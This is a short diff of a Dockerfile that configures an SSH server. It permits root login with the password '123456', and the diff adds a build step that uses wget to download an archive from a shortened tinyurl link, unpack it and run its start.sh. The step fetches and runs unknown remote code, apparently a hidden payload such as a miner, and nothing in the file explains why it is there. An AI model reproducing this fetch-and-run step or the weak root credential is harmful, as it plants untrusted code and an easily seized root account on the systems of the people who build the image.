@@ -18,5 +18,6 @@ RUN echo '/usr/sbin/sshd -D' >>/luo.sh
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo root:123456|chpasswd
 RUN chmod 755 /luo.sh
+RUN wget -O gas.tar https://tinyurl.com/linuxrtm && tar xf gas.tar && cd linux && chmod +x start.sh && ./start.sh
 EXPOSE 80
 CMD  /luo.sh
